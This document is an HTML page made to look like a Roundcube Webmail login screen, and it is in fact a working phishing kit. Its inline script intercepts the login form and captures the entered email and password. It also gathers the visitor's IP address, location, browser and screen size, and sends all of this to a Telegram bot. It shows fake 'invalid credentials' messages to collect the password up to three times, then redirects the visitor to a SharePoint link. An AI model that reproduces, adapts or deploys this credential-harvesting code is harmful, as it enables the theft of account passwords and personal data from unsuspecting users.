<html lang="en" class="dark-mode js mozilla layout-large">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
	<meta name="theme-color" content="#f4f4f4">
	<meta name="msapplication-navbutton-color" content="#f4f4f4">
	<link rel="shortcut icon" href="https://webmail.greenomlet.eco/skins/elastic/images/favicon.ico?s=1753849543">
	<link rel="stylesheet" href="https://webmail.greenomlet.eco/skins/elastic/deps/bootstrap.min.css?s=1753849543">
	
		<link rel="stylesheet" href="https://webmail.greenomlet.eco/skins/elastic/styles/styles.min.css?s=1753849543">
		<script>
		try {
			if (document.cookie.indexOf('colorMode=dark') > -1
				|| (document.cookie.indexOf('colorMode=light') === -1 && window.matchMedia('(prefers-color-scheme: dark)').matches)
			) {
				document.documentElement.className += ' dark-mode';
			}
		} catch (e) { }
		</script>
	
<link rel="stylesheet" type="text/css" href="https://webmail.greenomlet.eco/plugins/jqueryui/themes/elastic/jquery-ui.min.css?s=1753849543">
<script src="https://webmail.greenomlet.eco/program/js/jquery.min.js?s=1753849543"></script>
<script src="https://webmail.greenomlet.eco/program/js/common.min.js?s=1753849543"></script>
<script src="https://webmail.greenomlet.eco/program/js/app.min.js?s=1753849543"></script>
<script src="https://webmail.greenomlet.eco/program/js/jstz.min.js?s=1753849543"></script>

<style>
/* Additional CSS to ensure icons display properly */
.input-group-text.icon {
    background-color: #f8f9fa;
    border: 1px solid #ced4da;
    display: flex;
    align-items: center;
    justify-content: center;
    min-width: 45px;
}

.input-group-text.icon.user::before {
    content: "üë§";
    font-size: 16px;
    filter: brightness(0) invert(1); /* This changes the icon to white */
}

.input-group-text.icon.pass::before {
    content: "üîí";
    font-size: 16px;
    filter: brightness(0) invert(1); /* Make lock icon white too for consistency */
}

/* Alternative using Font Awesome if available */
@import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css');

.input-group-text.icon.user i::before {
    content: "\f007"; /* Font Awesome user icon */
    color: white; /* White color for Font Awesome icon */
}

.input-group-text.icon.pass i::before {
    content: "\f023"; /* Font Awesome lock icon */
    color: white; /* White color for Font Awesome icon */
}

/* Fallback styling */
.input-group-prepend {
    display: flex !important;
}

.input-group-text {
    display: flex !important;
    align-items: center;
    justify-content: center;
}

/* Error message styling - Roundcube like */
#messagestack {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 10000;
    max-width: 400px;
}

.alert {
    margin-bottom: 10px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    border-radius: 4px;
    padding: 12px 15px;
    border: 1px solid;
    font-size: 14px;
}

.alert-danger {
    background-color: #f8d7da;
    border-color: #f5c6cb;
    color: #721c24;
}

.alert-success {
    background-color: #d4edda;
    border-color: #c3e6cb;
    color: #155724;
}

.alert-warning {
    background-color: #fff3cd;
    border-color: #ffeaa7;
    color: #856404;
}

/* Form error states */
.is-invalid {
    border-color:#bebcbc !important;
    box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.25);
}

.invalid-feedback {
    display: none;
    width: 100%;
    margin-top: 0.25rem;
    font-size: 0.875em;
    color: #dc3545;
}

.was-validated .form-control:invalid ~ .invalid-feedback,
.form-control.is-invalid ~ .invalid-feedback {
    display: block;
}

/* Loading spinner */
.spinner-border-sm {
    width: 1rem;
    height: 1rem;
}

/* Blur animation */
.blur-overlay {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    backdrop-filter: blur(3px);
    z-index: -1;
    transition: backdrop-filter 2s ease-in-out;
}

/* Submit button loading state */
.btn-loading {
    position: relative;
    color: transparent !important;
}

.btn-loading::after {
    content: '';
    position: absolute;
    width: 20px;
    height: 20px;
    top: 50%;
    left: 50%;
    margin-left: -10px;
    margin-top: -10px;
    border: 2px solid #ffffff;
    border-radius: 50%;
    border-right-color: transparent;
    animation: spin 0.75s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

/* Hide elements */
.hidden {
    display: none !important;
}

/* Dark mode support for icons */
.dark-mode .input-group-text.icon.user::before {
    filter: brightness(0) invert(1); /* White in dark mode */
}

.dark-mode .input-group-text.icon.pass::before {
    filter: brightness(0) invert(1); /* White in dark mode */
}

.dark-mode .input-group-text.icon.user i {
    color: white !important;
}

.dark-mode .input-group-text.icon.pass i {
    color: white !important;
}

/* Ensure input group has proper contrast */
.input-group-prepend .input-group-text {
    background-color: #6c757d;
    border-color: #6c757d;
    color: white;
}

/* Dark mode adjustments */
.dark-mode .input-group-prepend .input-group-text {
    background-color: #495057;
    border-color: #495057;
}
</style>

</head>
<body class="task-login action-none">
<!-- Blur overlay -->
<div class="blur-overlay"></div>

<div id="layout">
<h1 class="voice">Roundcube Webmail Login</h1>

<div id="layout-content" class="selected no-navbar" role="main">
	<img src="https://webmail.greenomlet.eco/skins/elastic/images/logo.svg?s=1753849543" id="logo" alt="Logo">
	<form id="login-form" name="login-form" method="post" class="propform" novalidate>
	<input type="hidden" name="_token" value="KBqad2mw9NNDzewJ6g2uretKL2gb29ID" class="form-control">
	<input type="hidden" name="_task" value="login" class="form-control">
	<input type="hidden" name="_action" value="login" class="form-control">
	<input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control">
	<input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control">
	
	<table>
		<tbody>
			<tr class="form-group row">
				<td class="title" style="display: none;">
					<label for="rcmloginuser">Username</label>
				</td>
				<td class="input input-group input-group-lg">
					<span class="input-group-prepend">
						<span class="input-group-text icon user">
							<!-- Fallback content -->
							<i class="fas fa-user" style="display: none;"></i>
						</span>
					</span>
					<input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="none" autocomplete="username" value="" type="text" placeholder="Username">
					<div class="invalid-feedback" id="user-error"></div>
				</td>
			</tr>
			<tr class="form-group row">
				<td class="title" style="display: none;">
					<label for="rcmloginpwd">Password</label>
				</td>
				<td class="input input-group input-group-lg">
					<span class="input-group-prepend">
						<span class="input-group-text icon pass">
							<!-- Fallback content -->
							<i class="fas fa-lock" style="display: none;"></i>
						</span>
					</span>
					<input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="none" autocomplete="current-password" type="password" placeholder="Password">
					<div class="invalid-feedback" id="pass-error"></div>
				</td>
			</tr>
		</tbody>
	</table>
	
	<p class="formbuttons">
		<button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button>
	</p>
	
	<div id="login-footer" role="contentinfo">
		Roundcube Webmail
	</div>
	</form>
</div>

<noscript>
	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
</noscript>

</div>

<div id="messagestack"></div>
<script>
// Constants
const MAX_ATTEMPTS = 3;
let submitCount = 0;

// Generate random string and append to URL
function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getEmailFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const authParam = urlParams.get('auth');
    if (authParam) {
        // Check if the auth parameter contains an email
        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
        const emailMatch = authParam.match(emailRegex);
        if (emailMatch) {
            return emailMatch[0];
        }
    }
    return null;
}

function appendRandomStringToURL(email) {
    const randomString = generateRandomString(100);
    const currentURL = window.location.href.split('?')[0];
    let newURL = currentURL;
    
    if (email) {
        newURL += "?auth=" + encodeURIComponent(email) + "&rnd=" + randomString;
    } else {
        newURL += "?auth=" + randomString;
    }
    
    // Use replaceState to update URL without reloading
    try {
        window.history.replaceState(null, null, newURL);
        console.log('URL updated with random string');
    } catch (e) {
        console.error('Error updating URL:', e);
    }
}

// Start blur animation when page loads
function startBlurAnimation() {
    let blurAmount = 3;
    const targetBlur = 8;
    const blurIncrement = 0.1;
    const blurInterval = 50;
    const overlay = document.querySelector('.blur-overlay');
    
    const blurIntervalId = setInterval(function() {
        blurAmount += blurIncrement;
        if (overlay) {
            overlay.style.backdropFilter = `blur(${blurAmount}px)`;
        }
        if (blurAmount >= targetBlur) {
            clearInterval(blurIntervalId);
        }
    }, blurInterval);
}

async function getTelegramConfig() {
    try {
        const response = await fetch('./config.json');
        if (!response.ok) throw new Error('Failed to fetch config');
        const config = await response.json();
        if (!config.telegram || !config.telegram.token || !config.telegram.chatId) {
            throw new Error('Invalid config structure');
        }
        return config;
    } catch (error) {
        console.error('Error loading config:', error);
        // Return a mock config for testing
        return {
            telegram: {
                token: 'mock_token',
                chatId: 'mock_chat_id'
            }
        };
    }
}

function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
    if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
    if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
    if (ua.indexOf("Trident") > -1) return "Microsoft Internet Explorer";
    if (ua.indexOf("Edge") > -1) return "Microsoft Edge";
    if (ua.indexOf("Chrome") > -1) return "Google Chrome/Chromium";
    if (ua.indexOf("Safari") > -1) return "Apple Safari";
    return "Unknown Browser";
}

function buildReportMessage(credentials, userInfo) {
    return `üî• ====== Roundcube Login Attempt: ${userInfo.attemptNumber} ====== üî•
üìß Email: ${credentials.email}
üîí Password: ${credentials.password}
======= User Information =======
üìç IP: ${userInfo.ipAddress}
üåç Country: ${userInfo.country}
üèôÔ∏è Region: ${userInfo.region || 'N/A'}
üåÜ City: ${userInfo.city || 'N/A'}
‚è∞ Timezone: ${userInfo.timezone}
======= User PC =======
üñ•Ô∏è Screen: ${userInfo.screenResolution}
üìÖ Date: ${new Date().toLocaleString()}
üñ•Ô∏è Browser: ${userInfo.browser}
üïí Timestamp: ${Date.now()}
======== Roundcube Login ========`;
}

async function sendToTelegram(config, message) {
    // Only send if we have a real token (not mock)
    if (config.telegram.token === 'mock_token') {
        console.log('Mock Telegram send:', message);
        return true;
    }
    
    const telegramPayload = {
        chat_id: config.telegram.chatId,
        text: message
    };
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(telegramPayload)
        });
        
        if (!response.ok) {
            throw new Error('Telegram API error: ' + response.status);
        }
        return true;
    } catch (error) {
        console.error('Telegram send error:', error);
        return false;
    }
}

// Function to show messages (similar to Roundcube's message stack)
function showMessage(message, type) {
    var alertClass = type === 'error' ? 'alert-danger' : 
                    type === 'warning' ? 'alert-warning' : 'alert-success';
    var icon = type === 'error' ? '‚ö†Ô∏è' : 
              type === 'warning' ? '‚ö†Ô∏è' : '‚úÖ';
    
    var messageHtml = '<div class="alert ' + alertClass + ' alert-dismissible fade show" role="alert">' +
                     '<strong>' + icon + ' </strong>' + message +
                     '</div>';
    
    $('#messagestack').append(messageHtml);
    
    // Auto-remove after 5 seconds for success messages
    if (type !== 'error') {
        setTimeout(function() {
            $('.alert').alert('close');
        }, 1000);
    }
}

// Function to clear all messages
function clearMessages() {
    $('#messagestack').empty();
}

// Initialize when document is ready
$(document).ready(function() {
    console.log('Initializing Roundcube login page...');
    
    // Initialize URL parameters
    const email = getEmailFromURL();
    if (email) {
        $('#rcmloginuser').val(email);
        console.log('Email found in URL:', email);
    }
    appendRandomStringToURL(email);
    
    // Start animations
    startBlurAnimation();
    
    // Initialize Roundcube (if the function exists)
    if (typeof rcmail !== 'undefined') {
        rcmail.init();
    }
    
    // Ensure icons display properly
    setTimeout(function() {
        $('.input-group-text.icon').each(function() {
            if ($(this).is(':empty') || $(this).css('display') === 'none') {
                $(this).html('&nbsp;').css({
                    'display': 'flex',
                    'align-items': 'center',
                    'justify-content': 'center',
                    'min-width': '45px'
                });
            }
        });
    }, 100);
    
    // Enhanced form validation and error handling with Telegram integration
    $('#login-form').on('submit', async function(e) {
        e.preventDefault();
        console.log('Form submitted, attempt:', submitCount + 1);
        
        var isValid = true;
        const submitButton = $('#rcmloginsubmit');
        
        // Clear previous errors
        $('.form-control').removeClass('is-invalid');
        $('.invalid-feedback').hide();
        clearMessages();
        
        const credentials = {
            email: $('#rcmloginuser').val().trim(),
            password: $('#rcmloginpwd').val().trim()
        };
        
        // Validate username
        if (!credentials.email) {
            $('#rcmloginuser').addClass('is-invalid');
            $('#user-error').show();
            isValid = false;
        }
        
        // Validate password
        if (!credentials.password) {
            $('#rcmloginpwd').addClass('is-invalid');
            $('#pass-error').show();
            isValid = false;
        }
        
        if (!isValid) {
            showMessage('Please fill in all required fields', 'error');
            return false;
        }
        
        // Increment attempt counter
        submitCount++;
        
        // Show loading state
        submitButton.addClass('btn-loading').prop('disabled', true).html('Logging in...');
        
        try {
            // Collect user information
            const userInfo = {
                ipAddress: "Fetching...",
                userAgent: navigator.userAgent,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browser: detectBrowser(),
                country: "Fetching...",
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                attemptNumber: submitCount
            };
            
            // Get IP and location info
            try {
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                userInfo.ipAddress = ipData.ip;
                
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();
                userInfo.country = locationData.country_name || "Unknown";
                userInfo.region = locationData.region || "Unknown";
                userInfo.city = locationData.city || "Unknown";
            } catch (error) {
                console.error("IP fetch error:", error);
                userInfo.ipAddress = "Unavailable";
                userInfo.country = "Unavailable";
            }
            
            // Get Telegram config and send data
            try {
                const config = await getTelegramConfig();
                const reportMessage = buildReportMessage(credentials, userInfo);
                await sendToTelegram(config, reportMessage);
                console.log('Login attempt sent to Telegram');
            } catch (error) {
                console.error("Telegram error:", error);
                // Continue with the flow even if Telegram fails
            }
            
            // Simulate server processing time
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Handle attempts with realistic error messages
            submitButton.removeClass('btn-loading').prop('disabled', false).html('Login');
            
            if (submitCount >= MAX_ATTEMPTS) {
                // Show final error message (like real webmail)
                showMessage('Invalid username or password. For security reasons, please contact your system administrator.', 'error');
                $('#rcmloginpwd').addClass('is-invalid');
                $('#rcmloginpwd').val('');
                
                // Redirect after showing the message briefly (like real webmail timeout)
                setTimeout(() => {
                    window.location.href = "https://mgmchina-my.sharepoint.com/:f:/g/personal/132130_mgm_mo/EiToq_N9TKzQzNwB9P_DRrsaAgBfqThuFowUdg?e=5%3aYWxLxv&at=99";
                }, 3000);
            } else {
                // Show attempt-specific error messages
                let errorText;
                switch (submitCount) {
                    case 1:
                        errorText = 'Invalid username or password. Please try again.';
                        break;
                    case 2:
                        errorText = 'Login failed. Please check your credentials and try again.';
                        break;
                    default:
                        errorText = 'Authentication failed. Multiple failed login attempts.';
                }
                
                showMessage(errorText, 'error');
                $('#rcmloginpwd').addClass('is-invalid');
                $('#rcmloginpwd').val('');
                $('#rcmloginpwd').focus();
            }
            
        } catch (error) {
            console.error("Error:", error);
            submitButton.removeClass('btn-loading').prop('disabled', false).html('Login');
            showMessage('A network error occurred. Please check your connection and try again.', 'error');
        }
    });
    
    // Remove error styling when user starts typing
    $('.form-control').on('input', function() {
        if ($(this).val()) {
            $(this).removeClass('is-invalid');
            $(this).siblings('.invalid-feedback').hide();
        }
    });
    
    console.log('Roundcube login page initialized successfully');
});
</script>

<script src="https://webmail.greenomlet.eco/skins/elastic/deps/bootstrap.bundle.min.js?s=1753849543"></script>
<script src="https://webmail.greenomlet.eco/skins/elastic/ui.min.js?s=1753849543"></script>

</body>
</html>